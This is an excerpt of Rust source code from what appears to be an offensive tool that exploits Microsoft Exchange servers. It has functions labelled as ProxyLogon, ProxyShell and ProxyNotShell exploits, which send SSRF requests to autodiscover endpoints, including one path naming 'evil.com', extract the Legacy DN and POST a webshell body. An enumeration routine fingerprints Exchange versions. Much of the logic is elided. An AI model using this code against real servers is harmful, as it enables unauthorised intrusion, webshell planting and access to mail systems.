...
pub async fn proxylogon(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Exchange ProxyLogon (CVE-2021-26855) Exploit", "[*]".cyan().bold());
    ...
    let ssrf_paths = [
        "/ecp/y.js", "/ecp/DDI/DDIService.svc/GetObject",
    ...
    for path in &ssrf_paths {
        ...
        for (hkey, hval) in &headers {
            match client.get(&target).header(*hkey, *hval).send().await {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let text = r.text().await.unwrap_or_default();
                    if status == 200 && !text.is_empty() {
                        println!("  {} {:10} -> {:30} — {} bytes", "[!]".red().bold(), hkey, path, text.len());
                    }
                }
                Err(_) => {}
            }
    ...
    let target = format!("{}/autodiscover/autodiscover.xml", url.trim_end_matches('/'));
    match client.post(&target).header("Content-Type", "text/xml").body(legacy_dn_payload).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && (text.contains("LegacyDN") || text.contains("Server")) {
                println!("  {} Legacy DN extracted — ProxyLogon viable", "[!]".red().bold());
            } else {
...
pub async fn proxyshell(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Exchange ProxyShell (CVE-2021-34473) Exploit", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());
    ...
    let proxyshell_paths = [
        ("/autodiscover/autodiscover.json?@evil.com/owa/&Email=autodiscover/autodiscover.json%3f@evil.com", "SSRF via autodiscover.json"),
        ("/autodiscover/autodiscover.json?@target.com/mapi/npi/?&Email=administrator@target.com", "MAPI access"),
        ("/autodiscover/autodiscover.json?@target.com/EWS/exchange.asmx", "EWS access"),
        ("/autodiscover/autodiscover.json?@target.com/ecp/y.js", "ECP access"),
    ];
    ...
    for (path, name) in &proxyshell_paths {
        ...
        match client.get(&target).send().await {
            Ok(r) => {
                ...
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:30} — {} bytes", "[!]".red().bold(), name, text.len());
                } else {
    ...
    match client.post(&target).header("Content-Type", "text/xml").body(webshell).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            if status == 200 {
...
pub async fn proxynotshell(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Exchange ProxyNotShell (CVE-2022-41040/41082) Exploit", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());
    ...
    let client = build_client(timeout);
    let paths = [
        ("/autodiscover/autodiscover.json?@target.com/PowerShell/?X-Rps-CAT=VssDiag", "PowerShell SSRF"),
        ("/autodiscover/autodiscover.json?@target.com/RpcHttp/", "RPC HTTP SSRF"),
        ("/autodiscover/autodiscover.json?@target.com/EWS/exchange.asmx", "EWS SSRF"),
        ("/autodiscover/autodiscover.json?@target.com/ecp/DDI/DDIService.svc/SetObject", "ECP DDI"),
        ("/autodiscover/autodiscover.json?@target.com/ecp/DDI/DDIService.svc/GetObject", "ECP DDI read"),
    ];
...
pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (path, name) in &enum_endpoints {
        ...
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let server = r.headers().get("server").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
                if status == 200 || status == 401 || status == 403 {
                    println!("  {} {:30} — status={} server={}", "[+]".green().bold(), name, status, server);
                }
            }
            Err(_) => {}
        }
    ...
    let version_endpoints = ["/owa/auth/15.1.2176.2/themes/resources/owafont.css", "/owa/auth/15.2.986.5/themes/resources/owafont.css"];
    for vp in &version_endpoints {
        ...
        if let Ok(r) = client.get(&target).send().await {
            if r.status().as_u16() == 200 {
                ...
                println!("  {} Exchange version detected: {}", "[!]".red().bold(), ver);
            }
        }
    }
